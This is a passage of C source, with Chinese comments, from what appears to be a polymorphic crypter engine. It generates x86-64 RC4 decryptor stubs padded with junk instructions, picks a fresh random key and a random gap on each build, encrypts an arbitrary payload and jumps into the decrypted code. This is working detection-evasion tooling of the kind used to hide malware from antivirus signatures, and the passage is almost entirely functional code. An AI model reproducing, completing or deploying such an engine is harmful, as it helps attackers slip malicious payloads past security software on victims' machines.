    i_mov8_rm(e, r.rB2, r.rP, r.rL);              /* ct */
    i_xor8_rr(e, r.rB2, r.rA);
    i_mov8_mr(e, r.rP, r.rL, r.rB2);
    m_inc(p, e, r.rL);
    i_op32_ri32(e, 7, r.rL, (uint32_t)pay_len);
    size_t j_prga = i_jcc32(e, 0x85u);
    patch_jcc32(e, j_prga, prga_top);
    m_junks(p, e, r.rJunk);

    /* --- 收尾：恢复被调用者保存寄存器 -> 恢复栈帧 -> 跳向明文 --- */
    for (int t = ns - 1; t >= 0; t--)
        i_mov64_rm_d8(e, save[t], 4, (int)slot[t]);
    i_op_rsp_i32(e, 0, (int32_t)frame);   /* add rsp, frame */
    i_jmp64(e, r.rP);

    /*
     * 回填载荷指针偏移。rB 指向存根内偏移 rip_off 处（随取 RIP 变体而变），
     * 因此 delta = (存根总长 - rip_off) + 间隔长度。
     * 间隔必须在生成存根之前就定下来——它参与这个立即数，不能在事后补上。
     */
    uint32_t delta = (uint32_t)(e->n - rip_off + gap);
    if (variant == 2) delta = (uint32_t)(0u - delta);
    patch32(e, delta_imm, delta);

    (void)poff;
    return POLY_OK;
}

/* ------------------------------------------------------------------ */
/* 对外接口                                                            */
/* ------------------------------------------------------------------ */

int poly_build(poly_ctx *p, const uint8_t *payload, size_t pay_len,
               uint8_t **out, size_t *out_len)
{
    if (!p || !out || !out_len) return POLY_ERR_PARAM;
    if (!payload && pay_len)    return POLY_ERR_PARAM;
    if (pay_len > 0x7FFFFFFFu)  return POLY_ERR_TOOBIG;
    *out = NULL; *out_len = 0;

    /* 每次构建换一把密钥，密文本身即不同 */
    for (int k = 0; k < POLY_KEY_LEN; k++)
        p->key[k] = (uint8_t)(xs64(&p->rng) & 0xFFu);

    size_t gap = (size_t)rnd(p, 49u);   /* 0..48，必须早于存根生成 */

    ebuf e;
    memset(&e, 0, sizeof(e));
    int rc = gen_stub(p, &e, pay_len, gap);
    if (rc != POLY_OK) return rc;

    uint8_t *ct = NULL;
    if (pay_len) {
        ct = (uint8_t *)malloc(pay_len);
        if (!ct) return POLY_ERR_MEM;
        memcpy(ct, payload, pay_len);
        poly_rc4(p->key, ct, pay_len);
    }

    size_t total = e.n + gap + pay_len;
    uint8_t *art = (uint8_t *)malloc(total ? total : 1);
    if (!art) { free(ct); return POLY_ERR_MEM; }

    memcpy(art, e.b, e.n);
    for (size_t k = 0; k < gap; k++)
        art[e.n + k] = (uint8_t)(xs64(&p->rng) & 0xFFu);
    if (pay_len) memcpy(art + e.n + gap, ct, pay_len);
    free(ct);

    p->stub_len = e.n;
    p->gap_len  = gap;
    p->ct_off   = e.n + gap;
    p->have     = 1;

    *out = art;
    *out_len = total;
    return POLY_OK;
}

int poly_last_key(poly_ctx *p, uint8_t key[POLY_KEY_LEN])
{
    if (!p || !key || !p->have) return POLY_ERR_NOBUILD;
    memcpy(key, p->key, POLY_KEY_LEN);
    return POLY_OK;
}

int poly_last_span(poly_ctx *p, size_t *stub_len, size_t *gap_len, size_t *ct_off)
{
    if (!p || !p->have) return POLY_ERR_NOBUILD;
    if (stub_len) *stub_len = p->stub_len;
    if (gap_len)  *gap_len  = p->gap_len;
    if (ct_off)   *ct_off   = p->ct_off;
    return POLY_OK;
}
